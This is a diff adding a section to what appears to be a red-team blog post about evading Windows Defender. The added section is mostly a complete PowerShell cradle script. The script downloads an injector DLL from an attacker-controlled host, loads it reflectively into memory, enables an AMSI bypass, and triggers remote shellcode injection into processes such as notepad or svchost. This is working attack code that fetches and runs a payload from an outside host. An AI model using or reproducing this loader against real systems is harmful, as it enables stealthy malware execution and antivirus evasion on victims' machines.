@@ -126,4 +126,52 @@ Setting up a listener which will serve the DLL to be loaded and the shellcode :
 ![img2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img2.png)
 
 Before executing let's make sure Windows Defender is up to date.
+
 ![img3](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img3.png)
+
+To load the DLL into the memory and call the shellcode you might want to run cradle.ps1 if you dont want to do it manually...
+
+```powershell
+# MODULE
+$M = "currentthread"
+
+# LHOST
+$H = "192.168.88.142"
+
+# AMSI
+$A = "true"
+
+# DLL
+$D = "DInjector.dll"
+
+# SHELLCODE
+$S = "enc"
+
+# PASSWORD
+$P = "hahaWOW!!encrypt"
+
+# PROCESS
+$N = "notepad"
+
+# IMAGE
+$I = "C:\Windows\System32\svchost.exe"
+
+# --------------------------------------------------------------------
+
+$methods = @("remotethread", "remotethreadsuspended")
+if ($methods.Contains($M)) {
+    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
+}
+
+$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"
+
+$data = (IWR -UseBasicParsing "http://$H/$D").Content
+$assem = [System.Reflection.Assembly]::Load($data)
+
+$flags = [Reflection.BindingFlags] "NonPublic,Static"
+
+$class = $assem.GetType("DInjector.Detonator", $flags)
+$entry = $class.GetMethod("Boom", $flags)
+
+$entry.Invoke($null, (, $cmd.Split(" ")))
+```
